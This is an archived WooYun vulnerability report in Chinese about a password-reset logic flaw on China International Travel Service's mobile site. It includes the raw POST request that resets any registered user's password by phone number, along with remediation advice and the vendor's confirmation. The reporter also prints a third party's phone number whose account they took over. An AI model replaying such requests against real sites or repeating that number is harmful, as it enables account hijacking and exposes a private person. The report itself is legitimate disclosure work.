{"id": 13734, "wybug_id": "wooyun-2015-0119139", "wybug_title": "中国国旅网站可以修改任何人的登录密码/秒改", "wybug_corp": "中国国旅", "wybug_author": "路人甲", "wybug_date": "2015-06-08 23:00", "wybug_open_date": "2015-07-24 12:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向公众公开  简要描述： 这个危害有点严重啊，给个20rank 详细说明：  1.是下面这个站点，中国国旅网手机网站：http://m.cits.cn/\n\n2.按照正常注册账号，使用忘记密码功能走一遍重置账号的流程，登录接口如下：http://m.cits.cn/login.html\n\n3.重置后获取到修改密码的接口：\nPOST /login/passwordreset.html HTTP/1.1Host: m.cits.cnProxy-Connection: keep-aliveContent-Length: 76Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://m.cits.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://m.cits.cn/login/passwordreset.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: password=123456&again_password=123456&pageType=mobile&mobile=13888888888\n4.直接使用该功能进行重放，修改任意手机号，即可修改该账号的密码，前提该账户是注册用户；\n\n5.我使用了自己手机号进行测试，可以根据该接口正常修改账号，为了验证漏洞准确性，我找我乌云上另一个案例中的一个手机号码：http://static.loner.fm/upload/201504/11103819dcf397178541bdfa87d89b662f775157.png\n13601104284\n   漏洞证明：  6.修改该账号后成功登录：\n\n   修复方案：  1.很多网站都放了这个错误，重置密码的前面步骤验证都很严谨，但是到了最后一步用户改密码的时候，却忘记了验证这个用户能不能修改密码，做好各个验证步骤的耦合；2.被修改密码的那个用户请帮忙通知下，或者他自己能通过正常流程修改回来；3.这个漏洞很严重，给个20rank，鼓励继续挖你们的漏洞。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-09 11:25 厂商回复： 非常感谢您的报告，问题已处理,十分感谢您对中国国旅的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}